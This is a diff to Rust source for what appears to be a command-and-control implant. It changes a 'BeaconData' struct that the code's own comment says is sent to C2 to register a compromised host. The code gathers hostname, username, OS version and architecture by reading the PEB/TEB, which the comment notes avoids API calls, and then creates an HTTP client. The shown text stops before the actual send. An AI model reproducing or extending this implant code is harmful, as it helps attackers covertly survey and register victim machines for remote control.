@@ -2,36 +2,29 @@ use reqwest::blocking::Client;
 use serde::Serialize;
 use thermite::enumeration::*;
 
+/// Represents the data sent to C2 when beaconing \
+/// Contains all the necessary information to register a new host in the database
 #[derive(Serialize)]
 pub struct BeaconData {
 	pub hostname: String,
-	pub username: String,
-	pub version: (u32, u32, u32),
-	pub tmpdir: String,
-	pub appdata: String,
-	pub windir: String,
-	pub cwd: String,
-	pub cmdline: String,
-	pub pid: u64,
-	pub env: Vec<String>,
+	pub users: Vec<String>,
+	pub os_family: String,
+	pub os_version: String,
+	pub arch: String,
 }
 
 
 fn main() -> Result<(), String> {
-	let (cmdline, cwd, env, osver) = unsafe { (get_command_line(), get_current_directory(), get_environment(), get_os_version()) };
-	
+	let (maj, min, build) = unsafe { get_os_version() };
+	let arch = get_environment_var("PROCESSOR_ARCHITECTURE").unwrap_or("Unknown".to_string());
+	let os_family = get_environment_var("OS").unwrap_or("Unknown".to_string());
 	// All this information is gathered by reading the PEB/TEB, no API calls needed
 	let data = BeaconData {
 		hostname: get_computer_name(),
-		username: get_username(),
-		version: osver,
-		tmpdir: get_temp(),
-		appdata: get_appdata(),
-		windir: get_windir(),
-		cwd,
-		cmdline,
-		pid: get_process_id(),
-		env,
+		users: vec![get_username()],
+		os_family,
+		os_version: format!("{0}.{1} Build {2}", maj, min, build),
+		arch,
 	};
 
 	let client = Client::new();
